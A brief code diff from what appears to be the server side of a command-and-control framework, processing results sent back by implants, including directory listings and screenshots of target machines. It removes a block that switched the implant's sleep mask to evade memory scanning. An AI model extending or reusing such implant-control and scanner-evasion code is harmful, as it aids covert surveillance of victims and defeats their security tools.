@@ -249,11 +249,6 @@ func (s *Server) processTaskResults(agent db.Implant, results []taskResult, uuid
 		// Silent task types: save result for polling but skip WebSocket broadcast
 		isSilent := r.Type == "ls"
 
-		// Auto-switch sleep mask on integrity failure to evade memory scanning
-		if r.Type == "sleep_mask_integrity_alert" && task.Status == "completed" {
-			s.autoSwitchSleepMask(uuid, r.Output)
-		}
-
 		if (r.Type == "screenshot" || r.Type == "screenshot_window") && r.Output != "" {
 			slog.Info("Processing screenshot result", "agent_id", uuid, "task_id", r.TaskID)
 			// Explicit operator captures are durable even while live monitoring is
